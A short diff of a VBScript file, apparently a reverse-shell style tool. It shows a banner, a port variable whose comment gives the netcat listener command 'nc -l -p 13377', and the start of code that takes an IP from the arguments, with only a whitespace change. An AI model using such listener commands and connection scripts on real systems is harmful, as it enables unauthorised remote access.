@@ -7,7 +7,7 @@ asciiArt = "  _____            _      _____          _      " & vbCrLf _
         & " |_|  \_\___|\__,_|_/___|\_____\___/ \__,_|\___|"
 
 Dim po
-po = 13377 'nc -l -p 13377
+po = 13377 ' nc -l -p 13377
 
 Dim ip
 If WScript.Arguments.Count > 0 Then
